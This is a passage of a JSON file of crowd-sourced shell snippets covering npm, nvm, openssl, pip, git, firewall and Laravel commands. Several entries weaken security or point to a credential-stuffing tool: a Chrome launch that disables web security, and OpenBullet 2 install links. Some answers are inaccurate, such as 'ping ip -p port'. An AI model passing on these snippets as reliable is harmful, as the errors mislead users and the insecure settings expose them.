  {
    "id": 3725,
    "keyword": null,
    "link": null,
    "title": " npm to fix lint issues",
    "description": "npm run lint -- --fix \n",
    "reg_date": "2021-10-11T22:10:28.000Z"
  },
  {
    "id": 3726,
    "keyword": null,
    "link": null,
    "title": " npm to yarn migration",
    "description": "1. REMOVE: node_modules folder 2. REMOVE: package-lock.json, OR:(run \"yarn import\", moves package-lock to yarn.lock) 3. RUN in terminal: \"yarn\" 4. DONE!\n",
    "reg_date": "2021-10-11T22:10:29.000Z"
  },
  {
    "id": 3727,
    "keyword": null,
    "link": null,
    "title": " npm vercel",
    "description": "npm i -g vercel\n",
    "reg_date": "2021-10-11T22:10:29.000Z"
  },
  {
    "id": 3728,
    "keyword": null,
    "link": null,
    "title": " npx cap sync Unable to find node modules/@angular-eslint/builder",
    "description": "#just dont forget doing that npm i\n",
    "reg_date": "2021-10-11T22:10:29.000Z"
  },
  {
    "id": 3729,
    "keyword": null,
    "link": null,
    "title": " npx create-react-app error",
    "description": "npm init npm install create-react-app npx create-react-app myapp\n",
    "reg_date": "2021-10-11T22:10:29.000Z"
  },
  {
    "id": 3730,
    "keyword": null,
    "link": null,
    "title": " npx create-react-app not working",
    "description": "npm init npm install create-react-app npx create-react-app myapp\nnpm uninstall -g create-react-app npm cache clean --force npm install -g create-react-app\nyarn create react-app my-app cd my-app yarn set version berry yarn yarn start \n",
    "reg_date": "2021-10-11T22:10:29.000Z"
  },
  {
    "id": 3731,
    "keyword": null,
    "link": null,
    "title": " npx pod update",
    "description": "arch -x86_64 pod update\n",
    "reg_date": "2021-10-11T22:10:29.000Z"
  },
  {
    "id": 3732,
    "keyword": null,
    "link": null,
    "title": " npx react-native",
    "description": "npm install -g expo-cli \nnpx create-react-native-app\nnpx create-react-native-app\n",
    "reg_date": "2021-10-11T22:10:29.000Z"
  },
  {
    "id": 3733,
    "keyword": null,
    "link": null,
    "title": " nslookup not found ubuntu",
    "description": "apt-get update apt-get install dnsutils\n",
    "reg_date": "2021-10-11T22:10:29.000Z"
  },
  {
    "id": 3734,
    "keyword": null,
    "link": null,
    "title": " ntpq: read: connection refused",
    "description": "#First check ntpstat ntpstat  #if it says \"Unable to talk to NTP daemon. Is it running?, do systemctl status ntp  #it will show as inactive (dead), do systemctl restart ntp  #no output, do ntpstat  #it will say \"unsynchronised polling server every <some number> s\", do systemctl start ntp  #Solved #for creating a symlink, do sudo systemctl enable ntp\n",
    "reg_date": "2021-10-11T22:10:30.000Z"
  },
  {
    "id": 3735,
    "keyword": null,
    "link": null,
    "title": " nuget package manager restore",
    "description": "Update-Package -reinstall\n",
    "reg_date": "2021-10-11T22:10:30.000Z"
  },
  {
    "id": 3736,
    "keyword": null,
    "link": null,
    "title": " number fo files prestn in gcs bucket command",
    "description": "gsutil du gs://pub | wc -l\n",
    "reg_date": "2021-10-11T22:10:30.000Z"
  },
  {
    "id": 3737,
    "keyword": null,
    "link": null,
    "title": " nvidia driver ubuntu 20.04",
    "description": "$ sudo apt install nvidia-driver-440 \n",
    "reg_date": "2021-10-11T22:10:30.000Z"
  },
  {
    "id": 3738,
    "keyword": null,
    "link": null,
    "title": " nvm command not found",
    "description": "source ~/.nvm/nvm.sh \nsource $HOME/.nvm/nvm.sh\nbrew reinstall nvm\n# NVM Stuff export NVM_DIR=\"$HOME/.nvm\" . \"/usr/local/opt/nvm/nvm.sh\"\n# Check your .bash_profile, .zshrc, or .profile file. # You most likely had a problem during the installation. # You should have the following at the end of one of those files. [[ -s $HOME/.nvm/nvm.sh ]] && . $HOME/.nvm/nvm.sh  # This loads NVM\n",
    "reg_date": "2021-10-11T22:10:30.000Z"
  },
  {
    "id": 3739,
    "keyword": null,
    "link": null,
    "title": " nvm how to install latest node",
    "description": "//lists all versions nvm ls-remote  //installs the version you want (in this case version 14.0.0) nvm install v14.0.0  //use the version that you installed as the default nvm use v14.0.0 \n",
    "reg_date": "2021-10-11T22:10:30.000Z"
  },
  {
    "id": 3740,
    "keyword": null,
    "link": null,
    "title": " nvm how to install specific version of node",
    "description": "//lists all versions nvm ls-remote  //installs the version you want (in this case version 14.0.0) nvm install v14.0.0  //use the version that you installed as the default nvm use v14.0.0 \n",
    "reg_date": "2021-10-11T22:10:30.000Z"
  },
  {
    "id": 3741,
    "keyword": null,
    "link": null,
    "title": " nvm update node",
    "description": "nvm install-latest-npm\n//check node version >node -v // let's install a program called n that will let us easily switch  //between Node versions. >npm install -g n //Upgrading to the latest stable version >n stable  //Changing to a specific version >n 10.16.0 \nnvm install latest\n// to see which versions of node you have run: nvm ls  // example: // nvm ls //         v8.10.0 // ->      v8.16.0 //       v10.21.0 //         system // default -> 8.16.0 (-> v8.16.0)  // in this case use nvm use 10.21.0  // you can also uninstall and reinstall if you are having issues // by following the steps in: // https://stackabuse.com/how-to-uninstall-node-js-from-mac-osx/\n#!/bin/sh  set -e  cd ~/.nvm  git fetch --tags TAG=$(git describe --tags `git rev-list --tags --max-count=1`) echo \"Checking out tag $TAG...\" git checkout \"$TAG\"  source ~/.nvm/nvm.sh\n",
    "reg_date": "2021-10-11T22:10:30.000Z"
  },
  {
    "id": 3742,
    "keyword": null,
    "link": null,
    "title": " obs uninstall ubuntu",
    "description": "sudo apt-get remove obs-studio\n",
    "reg_date": "2021-10-11T22:10:30.000Z"
  },
  {
    "id": 3743,
    "keyword": null,
    "link": null,
    "title": " oh my zsh autocomplete",
    "description": "1 # clone repo for auto-suggestion and syntax-highlighting git clone https://github.com/zsh-users/zsh-autosuggestions.git $ZSH_CUSTOM/plugins/zsh-autosuggestions git clone https://github.com/zsh-users/zsh-syntax-highlighting.git $ZSH_CUSTOM/plugins/zsh-syntax-highlighting  2 # open config file  nano ~/.zshrc  3 # add \"zsh-autosuggestions zsh-syntax-highlighting\" in plugins section\n",
    "reg_date": "2021-10-11T22:10:31.000Z"
  },
  {
    "id": 3744,
    "keyword": null,
    "link": null,
    "title": " oh my zsh reset config",
    "description": "rm -f ~/.zshrc* \n",
    "reg_date": "2021-10-11T22:10:31.000Z"
  },
  {
    "id": 3745,
    "keyword": null,
    "link": null,
    "title": " oh my zsh update",
    "description": "omz update\n",
    "reg_date": "2021-10-11T22:10:31.000Z"
  },
  {
    "id": 3746,
    "keyword": null,
    "link": null,
    "title": " oh my zsh xcrun: error: invalid active developer path",
    "description": "xcode-select --install \n",
    "reg_date": "2021-10-11T22:10:31.000Z"
  },
  {
    "id": 3747,
    "keyword": null,
    "link": null,
    "title": " onedrive ubuntu 20.04",
    "description": "sudo add-apt-repository ppa:yann1ck/onedrive sudo apt install onedrive onedrive\n",
    "reg_date": "2021-10-11T22:10:31.000Z"
  },
  {
    "id": 3748,
    "keyword": null,
    "link": null,
    "title": " only show first lines linux",
    "description": "head -10 bar.txt\n",
    "reg_date": "2021-10-11T22:10:31.000Z"
  },
  {
    "id": 3749,
    "keyword": null,
    "link": null,
    "title": " open XAMPP in ubuntu",
    "description": "If you use a 64-bit system:  sudo /opt/lampp/manager-linux-x64.run\nsudo /opt/lampp/lampp start cd /opt/lampp/ ls sudo ./manager-linux-x64.run \n>>> cd /opt/lampp/  >>> ls   >>> sudo ./manager-linux-x64.run \nsudo /opt/lampp/manager-linux-x64.run\nsudo chmod 755 xampp-linux-x64-7.3.5.1-installer.run\n$ sudo apt install net-tools /*    */\n",
    "reg_date": "2021-10-11T22:10:31.000Z"
  },
  {
    "id": 3750,
    "keyword": null,
    "link": null,
    "title": " open bullet 2 installation on kali linux WEB",
    "description": "Best video process! https://www.youtube.com/watch?v=P5PwM0npy7E\n",
    "reg_date": "2021-10-11T22:10:31.000Z"
  },
  {
    "id": 3751,
    "keyword": null,
    "link": null,
    "title": " open chrome without web security mac",
    "description": "open -n -a /Applications/Google\\ Chrome.app/Contents/MacOS/Google\\ Chrome --args --user-data-dir=\"/tmp/chrome_dev_test\" --disable-web-security\n",
    "reg_date": "2021-10-11T22:10:32.000Z"
  },
  {
    "id": 3752,
    "keyword": null,
    "link": null,
    "title": " open cmd with size",
    "description": "# using bat files open the cmd with specified size mode con:cols=80 lines=100 \n",
    "reg_date": "2021-10-11T22:10:32.000Z"
  },
  {
    "id": 3753,
    "keyword": null,
    "link": null,
    "title": " open current  folder in linux using terminal gui",
    "description": "xdg-open .\nnautilus .\n",
    "reg_date": "2021-10-11T22:10:32.000Z"
  },
  {
    "id": 3754,
    "keyword": null,
    "link": null,
    "title": " open file explorer from cmd linux",
    "description": "xdg-open .\nnautlius .\n",
    "reg_date": "2021-10-11T22:10:32.000Z"
  },
  {
    "id": 3755,
    "keyword": null,
    "link": null,
    "title": " open folder from terminal in kali",
    "description": "xdg-open . \n",
    "reg_date": "2021-10-11T22:10:32.000Z"
  },
  {
    "id": 3756,
    "keyword": null,
    "link": null,
    "title": " open gedit from terminal without blocking",
    "description": "# & is used to run the file in the background # Warning: this command will close the gedit if you close terminal gedit filename &  # to stop gedit from closing even after you closed the terminal  # add disown gedit filename & disown\n",
    "reg_date": "2021-10-11T22:10:32.000Z"
  },
  {
    "id": 3757,
    "keyword": null,
    "link": null,
    "title": " open git gui from command line",
    "description": "git gui #git gui focuses on allowing users to make changes to their repository by  #making new commits, amending existing ones, creating branches, performing local #merges, and fetching/pushing to remote repositories.  #Unlike gitk, git gui focuses on commit generation and single file annotation  #and does not show project history\n",
    "reg_date": "2021-10-11T22:10:32.000Z"
  },
  {
    "id": 3758,
    "keyword": null,
    "link": null,
    "title": " open gui of git repo",
    "description": "git gui\n",
    "reg_date": "2021-10-11T22:10:33.000Z"
  },
  {
    "id": 3759,
    "keyword": null,
    "link": null,
    "title": " open jar file linux",
    "description": "java -jar filename.jar\n",
    "reg_date": "2021-10-11T22:10:33.000Z"
  },
  {
    "id": 3760,
    "keyword": null,
    "link": null,
    "title": " open jupyter notebook with anaconda in powershell",
    "description": "jupyter notebook #OR jupyter lab #to use jupyter lab #NB: Be sure to make default html application to be a browser.\n",
    "reg_date": "2021-10-11T22:10:33.000Z"
  },
  {
    "id": 3761,
    "keyword": null,
    "link": null,
    "title": " open port 22 centos 7",
    "description": "##By firewall-add port 22 firewall-cmd --zone=public --add-port=22/tcp --permanent firewall-cmd --reload  #check if port 22 open iptables-save | grep 22  #Remove  port 22 firewall-cmd --zone=public --remove-port=22/tcp --permanent firewall-cmd --reload  ##By iptables= add port 22 service iptables status service iptables start chkconfig --list iptables chkconfig iptables on iptables -L #add port iptables -A INPUT -i eth0 -p tcp --dport 22 -j ACCEPT #delete port iptables -D INPUT -i eth0 -p tcp --dport 22 -j ACCEPT  #check if port 22 open iptables-save | grep 22\nfirewall-cmd --zone=public --add-port=55555/tcp --permanent firewall-cmd --reload\n",
    "reg_date": "2021-10-11T22:10:33.000Z"
  },
  {
    "id": 3762,
    "keyword": null,
    "link": null,
    "title": " open pwd ubuntu wsl in windows explorer",
    "description": "explorer.exe .\n",
    "reg_date": "2021-10-11T22:10:33.000Z"
  },
  {
    "id": 3763,
    "keyword": null,
    "link": null,
    "title": " open realm studio ubuntu",
    "description": "./realm-studio-10.1.2.AppImage\n",
    "reg_date": "2021-10-11T22:10:33.000Z"
  },
  {
    "id": 3764,
    "keyword": null,
    "link": null,
    "title": " open the bash shell of docker container",
    "description": "command docker exec -it <container name> /bin/bash\n",
    "reg_date": "2021-10-11T22:10:33.000Z"
  },
  {
    "id": 3765,
    "keyword": null,
    "link": null,
    "title": " open visual studio code from terminal mac",
    "description": "#Add Bash alias in .bash_profile ? $ alias code=\"open -a /Applications/Visual\\ Studio\\ Code.app\"  #Open Visual Studio Code by command $ code .\nopen Visual Studio Code  press Cmd+shift+p search for ``Shell command: install 'code' command in PATH.`` and click it works in terminal #Open Visual Studio Code by command $ code .\ncat << EOF >> ~/.zshrc # Add Visual Studio Code (code) export PATH=\"/Applications/Visual Studio Code.app/Contents/Resources/app/bin:$PATH\" EOF\n$ alias code=\"open -a /Applications/Visual\\ Studio\\ Code.app\"  #Open Visual Studio Code by command $ code .\ncat << EOF >> ~/.bash_profile # Add Visual Studio Code (code) export PATH=\"\\$PATH:/Applications/Visual Studio Code.app/Contents/Resources/app/bin\" EOF\nLaunch VS Code. Open the Command Palette (Cmd+Shift+P) and type 'shell command' to find the Shell Command: Install 'code' command in PATH command. Restart the terminal Navigate to project folder in terminal,  Type code . press enter\n",
    "reg_date": "2021-10-11T22:10:34.000Z"
  },
  {
    "id": 3766,
    "keyword": null,
    "link": null,
    "title": " open xampp control panel from terminal ubuntu 20",
    "description": "//you have to stop the Apache2 and MySQL.  $sudo /etc/init.d/apache2 stop  $sudo /etc/init.d/mysql stop  //And then restart Xampp server  $sudo /opt/lampp/lampp restart \n",
    "reg_date": "2021-10-11T22:10:34.000Z"
  },
  {
    "id": 3767,
    "keyword": null,
    "link": null,
    "title": " open xcode workspace from terminal",
    "description": "# xed does this and ships with xcode. Run xed .\n",
    "reg_date": "2021-10-11T22:10:34.000Z"
  },
  {
    "id": 3768,
    "keyword": null,
    "link": null,
    "title": " openbullet2 installation on kali linux",
    "description": "Best video process! https://www.youtube.com/watch?v=P5PwM0npy7E\n",
    "reg_date": "2021-10-11T22:10:34.000Z"
  },
  {
    "id": 3769,
    "keyword": null,
    "link": null,
    "title": " openbullet 2 kali linux",
    "description": "Best video process! https://www.youtube.com/watch?v=P5PwM0npy7E\n",
    "reg_date": "2021-10-11T22:10:34.000Z"
  },
  {
    "id": 3770,
    "keyword": null,
    "link": null,
    "title": " openssh client for windows 10",
    "description": "Open powershell with admin and run below cmds: # Install the OpenSSH Client Add-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0  # Install the OpenSSH Server Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0  # Both of these should return the following output:  Path          : Online        : True RestartNeeded : False\n",
    "reg_date": "2021-10-11T22:10:34.000Z"
  },
  {
    "id": 3771,
    "keyword": null,
    "link": null,
    "title": " openssl command to check tls version",
    "description": "How can I verify if TLS 1.2 is supported on a remote web server from the RHEL/CentOS shell?  nmap --script ssl-enum-ciphers -p 443 www.example.com  |   TLSv1.2:  |     ciphers:  |       TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA - strong |       TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA - strong |       TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256 - strong |       TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256 - strong |       TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA - strong |       TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA384 - strong |       TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 - strong |       TLS_ECDHE_RSA_WITH_RC4_128_SHA - strong |       TLS_RSA_WITH_3DES_EDE_CBC_SHA - strong |       TLS_RSA_WITH_AES_128_CBC_SHA - strong |       TLS_RSA_WITH_AES_128_CBC_SHA256 - strong |       TLS_RSA_WITH_AES_128_GCM_SHA256 - strong |       TLS_RSA_WITH_AES_256_CBC_SHA - strong |       TLS_RSA_WITH_AES_256_CBC_SHA256 - strong |       TLS_RSA_WITH_AES_256_GCM_SHA384 - strong |       TLS_RSA_WITH_RC4_128_MD5 - strong |       TLS_RSA_WITH_RC4_128_SHA - strong |     compressors:  |       NULL   You could also use :  openssl s_client -connect google.com:443 -tls1_2   \n",
    "reg_date": "2021-10-11T22:10:34.000Z"
  },
  {
    "id": 3772,
    "keyword": null,
    "link": null,
    "title": " openssl p12 to pem",
    "description": "openssl pkcs12 -in keyStore.pfx -out keyStore.pem -nodes\nopenssl pkcs12 -in mycert.p12 -out ca.pem -cacerts -nokeys openssl pkcs12 -in mycert.p12 -out client.pem -clcerts -nokeys  openssl pkcs12 -in mycert.p12 -out key.pem -nocerts \n",
    "reg_date": "2021-10-11T22:10:34.000Z"
  },
  {
    "id": 3773,
    "keyword": null,
    "link": null,
    "title": " openssl read cert",
    "description": "openssl x509 -in certificate.crt -text -noout\n",
    "reg_date": "2021-10-11T22:10:34.000Z"
  },
  {
    "id": 3774,
    "keyword": null,
    "link": null,
    "title": " openssl version command",
    "description": "openssl version\n",
    "reg_date": "2021-10-11T22:10:34.000Z"
  },
  {
    "id": 3775,
    "keyword": null,
    "link": null,
    "title": " openssl view certificate",
    "description": "openssl x509 -in certificate.crt -text -noout\nopenssl x509\n",
    "reg_date": "2021-10-11T22:10:35.000Z"
  },
  {
    "id": 3776,
    "keyword": null,
    "link": null,
    "title": " org.apache.spark.api.python.PythonUtils.getPythonAuthSocketTimeout ubuntu",
    "description": "#insert those command in ~/.bashrc file export PYTHONPATH=$SPARK_HOME/python:$SPARK_HOME/python/lib/py4j-0.10.8.1-src.zip:$PYTHONPATH export PATH=$SPARK_HOME/bin:$SPARK_HOME/python:$PATH\n",
    "reg_date": "2021-10-11T22:10:35.000Z"
  },
  {
    "id": 3777,
    "keyword": null,
    "link": null,
    "title": " origin branch still showing in vscode though deleted",
    "description": "git fetch --all --prune\n",
    "reg_date": "2021-10-11T22:10:35.000Z"
  },
  {
    "id": 3778,
    "keyword": null,
    "link": null,
    "title": " origin git",
    "description": "# If you require full output and you are on a network that can reach the remote repo where the origin resides  git remote show origin \ngit remote add origin git@github.com:User/UserRepo.git \n# when you are not connected to the network, you can use this git config --get remote.origin.url \n",
    "reg_date": "2021-10-11T22:10:35.000Z"
  },
  {
    "id": 3779,
    "keyword": null,
    "link": null,
    "title": " package android.support.v4.content does not exist",
    "description": "import androidx.core.content.FileProvider; \nnpm install jetifier npx jetify npx cap sync android\nThis is likely happening because one of your dependencies is now using AndroidX instead of the support library. This means all dependencies need to use it, but this one hasn't been upgraded yet.  There is a tool which can handle the conversion for you, but it's currently  experimental.  https://github.com/mikehardy/jetifier#usage-for-source-files\n",
    "reg_date": "2021-10-11T22:10:35.000Z"
  },
  {
    "id": 3780,
    "keyword": null,
    "link": null,
    "title": " packages required to install psycopg2",
    "description": "pip install psycopg2-binary \n",
    "reg_date": "2021-10-11T22:10:35.000Z"
  },
  {
    "id": 3781,
    "keyword": null,
    "link": null,
    "title": " pacman remove unused dependencies",
    "description": "sudo pacman -Rsn $(pacman -Qdtq)\n",
    "reg_date": "2021-10-11T22:10:35.000Z"
  },
  {
    "id": 3782,
    "keyword": null,
    "link": null,
    "title": " pacman update",
    "description": "sudo pacman -Syu\nsudo apt-get update && sudo apt-get upgrade\npacman -Syu # sudo pacman -Syu\npacman -Syy\n",
    "reg_date": "2021-10-11T22:10:35.000Z"
  },
  {
    "id": 3783,
    "keyword": null,
    "link": null,
    "title": " paint for ubuntu",
    "description": "sudo apt install pinta\n",
    "reg_date": "2021-10-11T22:10:35.000Z"
  },
  {
    "id": 3784,
    "keyword": null,
    "link": null,
    "title": " passport deploy to server",
    "description": "//first run your migrations, then use $php artisan passport:install \n",
    "reg_date": "2021-10-11T22:10:36.000Z"
  },
  {
    "id": 3785,
    "keyword": null,
    "link": null,
    "title": " password zip file ubuntu",
    "description": "zip --encrypt test1.zip test1\n",
    "reg_date": "2021-10-11T22:10:36.000Z"
  },
  {
    "id": 3786,
    "keyword": null,
    "link": null,
    "title": " path debian",
    "description": "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/\n",
    "reg_date": "2021-10-11T22:10:36.000Z"
  },
  {
    "id": 3787,
    "keyword": null,
    "link": null,
    "title": " pathspec 'corp-branch' did not match any file(s) known to git",
    "description": "git remote update git fetch  git checkout --track origin/<BRANCH-NAME> \n",
    "reg_date": "2021-10-11T22:10:36.000Z"
  },
  {
    "id": 3788,
    "keyword": null,
    "link": null,
    "title": " pc specs linux command",
    "description": "# lshw - List Hardware $ sudo lshw -short H/W path        Device      Class       Description ===================================================                             system      () /0                          bus         DG35EC /0/0                        processor   Intel(R) Core(TM)2 Quad CPU    Q8400  @ 2.66GHz /0/0/1                      memory      2MiB L2 cache /0/0/3                      memory      32KiB L1 cache /0/2                        memory      32KiB L1 cache /0/4                        memory      64KiB BIOS /0/14                       memory      8GiB System Memory /0/14/0                     memory      2GiB DIMM DDR2 Synchronous 667 MHz (1.5 ns) /0/14/1                     memory      2GiB DIMM DDR2 Synchronous 667 MHz (1.5 ns) /0/14/2                     memory      2GiB DIMM DDR2 Synchronous 667 MHz (1.5 ns) /0/14/3                     memory      2GiB DIMM DDR2 Synchronous 667 MHz (1.5 ns) /0/100                      bridge      82G35 Express DRAM Controller /0/100/2                    display     82G35 Express Integrated Graphics Controller /0/100/2.1                  display     82G35 Express Integrated Graphics Controller /0/100/19       eth0        network     82566DC Gigabit Network Connection /0/100/1a                   bus         82801H (ICH8 Family) USB UHCI Controller #4 /0/100/1a.1                 bus         82801H (ICH8 Family) USB UHCI Controller #5 /0/100/1a.7                 bus         82801H (ICH8 Family) USB2 EHCI Controller #2 /0/100/1b                   multimedia  82801H (ICH8 Family) HD Audio Controller /0/100/1c                   bridge      82801H (ICH8 Family) PCI Express Port 1 /0/100/1c.1                 bridge      82801H (ICH8 Family) PCI Express Port 2 /0/100/1c.2                 bridge      82801H (ICH8 Family) PCI Express Port 3 /0/100/1c.2/0               storage     JMB368 IDE controller /0/100/1d                   bus         82801H (ICH8 Family) USB UHCI Controller #1 /0/100/1d.1                 bus         82801H (ICH8 Family) USB UHCI Controller #2 /0/100/1d.2                 bus         82801H (ICH8 Family) USB UHCI Controller #3 /0/100/1d.7                 bus         82801H (ICH8 Family) USB2 EHCI Controller #1 /0/100/1e                   bridge      82801 PCI Bridge /0/100/1e/5                 bus         FW322/323 [TrueFire] 1394a Controller /0/100/1f                   bridge      82801HB/HR (ICH8/R) LPC Interface Controller /0/100/1f.2                 storage     82801H (ICH8 Family) 4 port SATA Controller [IDE mode] /0/100/1f.3                 bus         82801H (ICH8 Family) SMBus Controller /0/100/1f.5                 storage     82801HR/HO/HH (ICH8R/DO/DH) 2 port SATA Controller [IDE m /0/1            scsi3       storage /0/1/0.0.0      /dev/sda    disk        500GB ST3500418AS /0/1/0.0.0/1    /dev/sda1   volume      70GiB Windows NTFS volume /0/1/0.0.0/2    /dev/sda2   volume      395GiB Extended partition /0/1/0.0.0/2/5  /dev/sda5   volume      97GiB HPFS/NTFS partition /0/1/0.0.0/2/6  /dev/sda6   volume      97GiB Linux filesystem partition /0/1/0.0.0/2/7  /dev/sda7   volume      1952MiB Linux swap / Solaris partition /0/1/0.0.0/2/8  /dev/sda8   volume      198GiB Linux filesystem partition /0/3            scsi4       storage /0/3/0.0.0      /dev/cdrom  disk        DVD RW DRU-190A\n# PC Specs $ sudo lshw -short\n# List RAM Memory Information lshw -short -C memory\n",
    "reg_date": "2021-10-11T22:10:36.000Z"
  },
  {
    "id": 3789,
    "keyword": null,
    "link": null,
    "title": " percorrer directoria shell script",
    "description": "for d in */ ; do     echo \"$d\" done\n",
    "reg_date": "2021-10-11T22:10:36.000Z"
  },
  {
    "id": 3790,
    "keyword": null,
    "link": null,
    "title": " permission denied: ./deploy.sh",
    "description": "chmod +x the_file_name\n",
    "reg_date": "2021-10-11T22:10:36.000Z"
  },
  {
    "id": 3791,
    "keyword": null,
    "link": null,
    "title": " permission denied bash",
    "description": "`# Try:` chmod +rx script.sh `# This will make the file executable. Then try:` ./script.sh\nchmod -R +x folder/* # give execution permission for all scripts in the directory\nsudo chown -R francisco-vergara:francisco-vergara /home/sixven/camp_sms/inputs \n",
    "reg_date": "2021-10-11T22:10:36.000Z"
  },
  {
    "id": 3792,
    "keyword": null,
    "link": null,
    "title": " permission denied running shell script",
    "description": "`# Try:` chmod +rx script.sh `# This will make the file executable. Then try:` ./script.sh\nchmod -R +x folder/* # give execution permission for all scripts in the directory\n",
    "reg_date": "2021-10-11T22:10:37.000Z"
  },
  {
    "id": 3793,
    "keyword": null,
    "link": null,
    "title": " perticuler version install npm",
    "description": "npm install react-native@0.63.3\n",
    "reg_date": "2021-10-11T22:10:37.000Z"
  },
  {
    "id": 3794,
    "keyword": null,
    "link": null,
    "title": " pg hba.conf location ubuntu 18.04",
    "description": "/etc/postgresql/8.4/main/pg_hba.conf /etc/postgresql/9.1/main/pg_hba.conf \n/etc/postgresql/9.1/main/pg_hba.conf\n",
    "reg_date": "2021-10-11T22:10:37.000Z"
  },
  {
    "id": 3795,
    "keyword": null,
    "link": null,
    "title": " pgdmp file",
    "description": "pg_restore -f mydatabase.sql mydatabase.dump \n",
    "reg_date": "2021-10-11T22:10:37.000Z"
  },
  {
    "id": 3796,
    "keyword": null,
    "link": null,
    "title": " php artisan auth",
    "description": "// How to install Auth in laravel  // With Boothstrap composer require laravel/ui --dev php artisan ui bootstrap --auth npm install && npm run dev  // With VUE composer require laravel/ui --dev php artisan ui vue --auth npm install && npm run dev\ncomposer require laravel/ui php artisan ui vue --auth\ncomposer require laravel/ui php artisan ui vue --auth php artisan migrate \ncomposer require laravel/ui php artisan ui vue --auth \ncomposer require laravel/ui  php artisan ui bootstrap  php artisan ui bootstrap --auth  npm install && npm run dev\nset up auth laravel 7 ----------------- composer require laravel/ui:^2.4  php artisan ui vue --auth\n",
    "reg_date": "2021-10-11T22:10:37.000Z"
  },
  {
    "id": 3797,
    "keyword": null,
    "link": null,
    "title": " php artisan clear",
    "description": "php artisan cache:clear php artisan route:clear php artisan config:clear  php artisan view:clear \n#laravel php artisan clear  php artisan view:clear  php artisan cache:clear php artisan route:clear php artisan config:clear\n//laravel artisan clear cache  php artisan view:clear  php artisan cache:clear php artisan route:clear php artisan config:clear\n//Updated Dec 2020 //laravel artisan clear cache  php artisan view:clear  php artisan cache:clear php artisan route:clear php artisan config:clear\nphp artisan view:clear  \n<?php   // how to clear artisan in Laravel php artisan config:clear php artisan view:clear  php artisan cache:clear php artisan route:clear  ?>\n",
    "reg_date": "2021-10-11T22:10:37.000Z"
  },
  {
    "id": 3798,
    "keyword": null,
    "link": null,
    "title": " php artisan rollback step 1",
    "description": "php artisan migrate:rollback --step=1\n",
    "reg_date": "2021-10-11T22:10:37.000Z"
  },
  {
    "id": 3799,
    "keyword": null,
    "link": null,
    "title": " php install apcu",
    "description": "sudo apt-get install php-apcu\n",
    "reg_date": "2021-10-11T22:10:37.000Z"
  },
  {
    "id": 3800,
    "keyword": null,
    "link": null,
    "title": " php restart",
    "description": "systemctl restart php-fpm.service\nWin + R type:iisreset  Or, more verbose: iisreset inside a powershell  opened as administrator - or even inside a Cygwin shell.\n",
    "reg_date": "2021-10-11T22:10:38.000Z"
  },
  {
    "id": 3801,
    "keyword": null,
    "link": null,
    "title": " phpunit/phpunit[8.5.8, ..., 8.5.x-dev, 9.3.3, ..., 9.5.x-dev] require ext-dom * -> it is missing from your system. Install or enable PHP's dom extension",
    "description": "sudo apt install php-xml\n",
    "reg_date": "2021-10-11T22:10:38.000Z"
  },
  {
    "id": 3802,
    "keyword": null,
    "link": null,
    "title": " pi samba config",
    "description": "sudo nano /etc/samba/smb.conf\nsudo smbpasswd -a pi\n",
    "reg_date": "2021-10-11T22:10:38.000Z"
  },
  {
    "id": 3803,
    "keyword": null,
    "link": null,
    "title": " ping a port linux",
    "description": "ping ip -p port\n# Use the below command in your terminal # No requirments are needed (echo >/dev/tcp/{host}/{port}) &>/dev/null && echo \"open\" || echo \"close\"  # An example below (echo >/dev/tcp/10.20.20.21/27017) &>/dev/null && echo \"open\" || echo \"close\"  # if open then it will return \"open\" # if closed then it will return \"close\" # if you can't connect to it then it will freeze, use ctrl+c\n",
    "reg_date": "2021-10-11T22:10:38.000Z"
  },
  {
    "id": 3804,
    "keyword": null,
    "link": null,
    "title": " ping command not found",
    "description": "apt-get update apt-get install iputils-ping\n$ sudo apt install iputils-ping\n",
    "reg_date": "2021-10-11T22:10:39.000Z"
  },
  {
    "id": 3805,
    "keyword": null,
    "link": null,
    "title": " ping raspberry pi",
    "description": "ping raspberrypi.local\nnmap -sV -p 22 192.168.1.0/24\n",
    "reg_date": "2021-10-11T22:10:39.000Z"
  },
  {
    "id": 3806,
    "keyword": null,
    "link": null,
    "title": " pip-compile install",
    "description": "$ pip3 install pip-tools  # env $ pip install pip-tools\n",
    "reg_date": "2021-10-11T22:10:39.000Z"
  },
  {
    "id": 3807,
    "keyword": null,
    "link": null,
    "title": " pip3.8 install ubuntu",
    "description": "$ sudo apt update $ sudo apt install python3-pip\n$ sudo apt update $ sudo apt install python3-pip \n",
    "reg_date": "2021-10-11T22:10:39.000Z"
  },
  {
    "id": 3808,
    "keyword": null,
    "link": null,
    "title": " pip3 not found",
    "description": "sudo apt-get remove python3-pip; sudo apt-get install python3-pip \npython -m ensurepip  ##possibly the best way to autmatically install pip, if it is not found \n#for pip, and not pip3: sudo apt-get install python-pip\napt-get install python3-pip \n",
    "reg_date": "2021-10-11T22:10:39.000Z"
  },
  {
    "id": 3809,
    "keyword": null,
    "link": null,
    "title": " pip3 uninstall all",
    "description": "pip3 freeze | xargs pip3 uninstall -y\npip freeze > requirements.txt pip uninstall -r requirements.txt\n#Write all modules to a txt file pip freeze > requirements.txt  #Now to remove one by one: pip uninstall -r requirements.txt  #If we want to remove all at once then: pip uninstall -r requirements.txt -y\npip freeze | xargs pip uninstall -y \ntype \"pip freeze\" to get list of all installed packages. Copy all the names into a text file name it pkg.txt then type the following \"pip uninstall -r pkg.txt\" you will be asked to proceed type \"y\" and enter\n",
    "reg_date": "2021-10-11T22:10:39.000Z"
  },
  {
    "id": 3810,
    "keyword": null,
    "link": null,
    "title": " pip 21.0.1 install windows",
    "description": "curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py \npy get-pip.py \n",
    "reg_date": "2021-10-11T22:10:39.000Z"
  },
  {
    "id": 3811,
    "keyword": null,
    "link": null,
    "title": " pip check for updates",
    "description": "$ pip list --outdated\n",
    "reg_date": "2021-10-11T22:10:40.000Z"
  },
  {
    "id": 3812,
    "keyword": null,
    "link": null,
    "title": " pip command not found macos",
